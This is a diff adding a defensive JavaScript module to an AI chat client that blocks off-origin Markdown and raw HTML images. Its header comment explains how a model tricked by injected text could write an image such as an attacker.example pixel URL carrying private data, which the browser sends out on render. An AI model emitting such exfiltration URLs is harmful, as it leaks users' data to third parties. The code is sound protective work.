@@ -588,3 +588,197 @@ window.CoreAIAntiforgery = window.CoreAIAntiforgery || (function () {
         apply: apply
     };
 })();
+
+/*
+ * Which Markdown images the chat draws.
+ *
+ * A model's answer is rendered as Markdown, and an image in it makes the browser fetch its address without a click.
+ * Text the model was tricked into writing, or read out of a document it was given, can put what it knows in that
+ * address -- ![](https://attacker.example/pixel?data=...) -- and the visitor's browser sends it as soon as the answer
+ * is shown. So an image is only drawn when it comes from the page's own origin, from a host the page lists in
+ * allowedImageHosts, or is a data or blob image, which makes no request. Any other image is shown as a plain link the
+ * visitor has to choose to follow.
+ *
+ * allowedImageHosts is an array of host names: "images.example.com" matches that host, "*.example.com" matches its
+ * subdomains (not the bare domain). Empty or missing means same-origin only. It is a chat config option on both chat
+ * clients, so the host decides which sources it trusts.
+ */
+window.CoreAIImages = window.CoreAIImages || (function () {
+    'use strict';
+
+    const rawImageHook = 'afterSanitizeAttributes';
+
+    function escapeHtml(text) {
+        return String(text == null ? '' : text)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;');
+    }
+
+    // "https://Images.Example.com/path" and "images.example.com" are the same entry.
+    function normalizeHost(entry) {
+        if (typeof entry !== 'string') {
+            return '';
+        }
+
+        return entry.trim().toLowerCase().replace(/^[a-z][a-z0-9+.-]*:\/\//, '').split(/[/?#]/)[0];
+    }
+
+    function hostMatches(url, entry) {
+        const host = normalizeHost(entry);
+
+        if (!host) {
+            return false;
+        }
+
+        // An entry with a port names that port; one without matches the host on any port.
+        const candidate = host.includes(':') ? url.host.toLowerCase() : url.hostname.toLowerCase();
+
+        if (host.startsWith('*.')) {
+            return candidate.endsWith(host.slice(1)) && candidate.length > host.length - 1;
+        }
+
+        return candidate === host;
+    }
+
+    function pageAddress(options) {
+        if (options && options.baseUrl) {
+            return options.baseUrl;
+        }
+
+        return window.location && window.location.href ? window.location.href : null;
+    }
+
+    function isAllowedSource(src, options) {
+        if (typeof src !== 'string') {
+            return false;
+        }
+
+        const address = src.trim();
+
+        if (!address) {
+            return false;
+        }
+
+        // A data image is the picture itself: it cannot ask the network for anything.
+        if (/^data:image\//i.test(address)) {
+            return true;
+        }
+
+        const base = pageAddress(options);
+
+        if (!base) {
+            return false;
+        }
+
+        let url;
+        let page;
+
+        try {
+            url = new URL(address, base);
+            page = new URL(base);
+        } catch (error) {
+            return false;
+        }
+
+        if (url.protocol === 'blob:') {
+            return url.origin === page.origin;
+        }
+
+        if (url.protocol !== 'http:' && url.protocol !== 'https:') {
+            return false;
+        }
+
+        if (url.origin === page.origin) {
+            return true;
+        }
+
+        const hosts = options && Array.isArray(options.allowedHosts) ? options.allowedHosts : [];
+
+        return hosts.some(function (entry) { return hostMatches(url, entry); });
+    }
+
+    // Only an address a visitor can safely follow is linked; anything else is shown as text.
+    function isSafeLinkTarget(href) {
+        return typeof href === 'string' && /^(https?:\/\/|\/(?!\/)|[^:]*$)/i.test(href.trim()) && !/^\s*(javascript|vbscript|data):/i.test(href);
+    }
+
+    // What replaces an image that is not allowed. The address stays visible and one click away, and nothing loads.
+    function linkHtml(href, label) {
+        const text = typeof label === 'string' && label.trim() ? label.trim() : (href || '');
+
+        if (!isSafeLinkTarget(href) || !href) {
+            return escapeHtml(text);
+        }
+
+        return '<a href="' + escapeHtml(href) + '" target="_blank" rel="noopener noreferrer">' + escapeHtml(text) + '</a>';
+    }
+
+    // The same replacement as an element, for an <img> the sanitizer finds in the answer's raw HTML.
+    function linkElement(href, label) {
+        const text = typeof label === 'string' && label.trim() ? label.trim() : (href || '');
+        const linkable = isSafeLinkTarget(href) && !!href;
+        const element = document.createElement(linkable ? 'a' : 'span');
+
+        if (linkable) {
+            element.setAttribute('href', href);
+            element.setAttribute('target', '_blank');
+            element.setAttribute('rel', 'noopener noreferrer');
+        }
+
+        element.textContent = text;
+
+        return element;
+    }
+
+    /*
+     * DOMPurify.sanitize for the HTML of an answer. An <img> the model wrote as raw HTML never goes through the
+     * Markdown image renderer, so the same rule is applied here, while the sanitizer walks the elements. The hook is
+     * registered for this one call only, so it never applies to the other things the page sanitizes.
+     */
+    function sanitize(purify, html, purifyConfig, options) {
+        const hook = function (node) {
+            if (!node || typeof node.tagName !== 'string') {
+                return;
+            }
+
+            const tag = node.tagName.toUpperCase();
+
+            // A srcset names more addresses than src does, and a <source> in a <picture> is read like one.
+            if (tag === 'SOURCE') {
+                node.removeAttribute('srcset');
+                node.removeAttribute('src');
+
+                return;
+            }
+
+            if (tag !== 'IMG') {
+                return;
+            }
+
+            node.removeAttribute('srcset');
+
+            const src = node.getAttribute('src');
+
+            if (!isAllowedSource(src, options)) {
+                node.replaceWith(linkElement(src, node.getAttribute('alt')));
+            }
+        };
+
+        purify.addHook(rawImageHook, hook);
+
+        try {
+            return purify.sanitize(html, purifyConfig);
+        } finally {
+            purify.removeHook(rawImageHook, hook);
+        }
+    }
+
+    return {
+        isAllowedSource: isAllowedSource,
+        linkHtml: linkHtml,
+        sanitize: sanitize
+    };
+})();
